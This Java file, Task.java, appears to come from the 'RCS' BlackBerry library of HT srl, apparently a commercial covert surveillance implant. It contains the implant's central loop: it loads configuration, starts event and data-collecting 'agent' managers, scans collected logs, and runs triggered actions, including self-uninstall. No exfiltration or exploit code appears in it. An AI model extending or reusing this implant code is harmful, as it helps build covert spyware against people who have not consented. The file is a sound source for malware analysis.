/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Task.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import java.util.Vector;

import com.ht.rcs.blackberry.action.Action;
import com.ht.rcs.blackberry.action.SubAction;
import com.ht.rcs.blackberry.log.LogCollector;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Task.
 */
public class Task {

    private static final int SLEEPING_TIME = 1000;

    /** The debug instance. */
	//#debug
    private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);

    /** The conf. */
    Conf conf = null;

    /** The status. */
    Status status = null;

    /** The device. */
    Device device = null;

    /** The log collector. */
    LogCollector logCollector = null;

    /** The event manager. */
    EventManager eventManager = null;

    /** The agent manager. */
    AgentManager agentManager = null;

    /**
     * Instantiates a new task.
     */
    public Task() {
        // Istanziamo qui tutti gli oggetti singleton dopo aver inizializzato le
        // code
        status = Status.getInstance();
        device = Device.getInstance();
        logCollector = LogCollector.getInstance();

        eventManager = EventManager.getInstance();
        agentManager = AgentManager.getInstance();
    }

    /**
     * Check actions.
     * 
     * @return true, if successful
     */
    public synchronized boolean checkActions() {
        Utils.sleep(1000);

        for (;;) {
            // debug.trace("checkActions");
            Vector actions = this.status.getActionsList();

            int asize = actions.size();
            for (int i = 0; i < asize; ++i) {
                Action action = (Action) actions.elementAt(i);

                if (action.isTriggered() == false) {
                    continue;
                }

                // #debug
                debug.trace("CheckActions() triggered" + action);

                action.setTriggered(false);

                Vector subActions = action.getSubActionsList();

                int ssize = subActions.size();
                for (int j = 0; j < ssize; ++j) {

                    SubAction subAction = (SubAction) subActions.elementAt(j);
                    boolean ret = subAction.execute();

                    if (ret == false) {
                        break;
                    }

                    if (subAction.wantUninstall()) {
                        // #debug
                        debug.warn("CheckActions() uninstalling");
                        agentManager.stopAll();
                        eventManager.stopAll();
                        return false;
                    }

                    if (subAction.wantReload()) {
                        // #debug
                        debug.warn("CheckActions() reloading");
                        agentManager.stopAll();
                        eventManager.stopAll();
                        return true;
                    }
                }
            }

            Utils.sleep(SLEEPING_TIME);
        }

    }

    /**
     * Task init.
     * 
     * @return true, if successful
     */
    public boolean taskInit() {
        // #debug
        debug.trace("TaskInit");

        agentManager.stopAll();
        eventManager.stopAll();

        if (device != null) {
            device.refreshData();
        }

        conf = new Conf();

        if (conf.load() == false) {
            // #debug
            debug.trace("TaskInit - Load Conf FAILED");

            return false;
        }

        Msg.demo("Configuration... OK\n");

        if (logCollector != null) {
            logCollector.scanLogs();
        }

        // Da qui in poi inizia la concorrenza dei thread
        if (eventManager.startAll() == false) {
            // #debug
            debug.trace("TaskInit - eventManager FAILED");
            return false;
        }

        if (agentManager.startAll() == false) {
            // #debug
            debug.trace("TaskInit - agentManager FAILED");
            return false;
        }

        // #debug
        debug.info("TaskInit - agents started");
        return true;
    }
}
